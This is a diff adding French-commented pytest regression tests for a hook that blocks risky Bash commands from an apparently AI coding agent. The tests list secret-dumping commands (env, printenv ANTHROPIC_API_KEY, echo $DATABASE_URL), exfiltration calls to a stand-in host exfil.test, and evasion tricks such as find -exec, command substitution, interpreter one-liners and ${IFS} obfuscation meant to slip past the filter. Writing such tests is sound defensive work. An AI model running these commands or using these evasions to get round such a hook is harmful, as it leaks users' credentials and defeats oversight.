@@ -410,3 +410,87 @@ def test_regression_faux_positifs_devops(command, audit_log):
 ])
 def test_l_assouplissement_n_ouvre_rien(command, audit_log):
     assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+# --------------------------------------------------------------------------- #
+# Round 4 — régressions de la réécriture du round 3, et angles morts
+# --------------------------------------------------------------------------- #
+
+
+@pytest.mark.parametrize("command", [
+    # `find` n'est pas une enveloppe : l'analyse s'arrêtait dessus et la règle
+    # `-exec` n'était jamais atteinte.
+    r"find /tmp -exec env \;",
+    r"find /tmp -exec printenv ANTHROPIC_API_KEY \;",
+    r"find /tmp -exec curl https://exfil.test/ \;",
+    r"find / -name x -exec sh -c 'env' \;",
+    "strace -e trace=execve /bin/sh -c env",
+])
+def test_regression_commande_passee_en_argument(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # Retirer la substitution faisait disparaître un argument que le shell,
+    # lui, fournit bel et bien à l'exécution.
+    "curl http://127.0.0.1/ $(echo http://exfil.test/x)",
+    "curl http://localhost/ `echo http://exfil.test/x`",
+    "curl -x $(echo http://exfil.test/) http://127.0.0.1/",
+    "wget http://localhost/ $(printf 'http://exfil.test/x')",
+    'bash -c "$(echo env)"',
+    "sudo $(echo env)",
+    "$(echo env)",
+])
+def test_regression_sortie_de_substitution_consommee(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # Deux listes de noms sensibles divergeaient : `printenv DATABASE_URL`
+    # était refusé quand `echo $DATABASE_URL` passait.
+    "echo $DATABASE_URL", "echo $CONNECTION_STRING", "echo $SESSION_KEY",
+    "echo $SENTRY_DSN", "echo $ENCRYPTION_KEY", "echo $SIGNING_KEY",
+    # référence indirecte : le nom lu vient d'une affectation
+    "name=AWS_SECRET_ACCESS_KEY; echo ${!name}",
+])
+def test_regression_familles_de_variables_secretes(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # Un programme donné EN LIGNE est du code : aucune syntaxe commune ne
+    # délimite ses mots.
+    """perl -e 'system "env"'""", """perl -e 'exec "env"'""",
+    """ruby -e 'exec "env"'""", "perl -e 'qx/env/'", "ruby -e '%x[env]'",
+    """python3 -c 'import subprocess; subprocess.run(("env",))'""",
+    """python3 -c 'import subprocess; subprocess.getstatusoutput("env")'""",
+    """python3 -c 'from os import environ; print(environ)'""",
+    """python3 -c 'import os; print(getattr(os, "environ"))'""",
+    """node -e 'console.log(process["env"])'""",
+    # `${IFS}` s'évalue en espace : la commande réelle est `env > dump`.
+    "env${IFS}> /tmp/dump.txt",
+])
+def test_regression_interpreteur_et_obfuscation(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # Symétrie avec `echo $VAR` : la config se lit des deux façons.
+    "printenv AWS_REGION", "printenv ANTHROPIC_BASE_URL",
+    # Sous-commandes d'openssl qui n'ouvrent aucune connexion.
+    "openssl rand -hex 32", "openssl dgst -sha256 fichier.txt",
+    "openssl passwd -1 motdepasse", "ssh -V", "wget --version",
+    # Substitutions ordinaires : ce n'est pas la substitution qui gêne, c'est
+    # sa consommation par un programme réseau ou en position de programme.
+    "echo 'result: '$(date)", "cd $(git rev-parse --show-toplevel)",
+    "ls $(cat liste.txt)", "for f in $(ls); do echo $f; done",
+    "echo ${!arr[@]}", "find . -name '*.py' -newer setup.py",
+    """python3 -c 'print("hello")'""",
+])
+def test_le_durcissement_du_round4_n_ajoute_pas_de_faux_positifs(command, audit_log):
+    assert not is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+def test_openssl_reste_bloque_quand_il_sort_sur_le_reseau(audit_log):
+    assert is_denied(run_hook(
+        "Bash", {"command": "openssl s_client -connect exfil.test:443"}, audit_log))
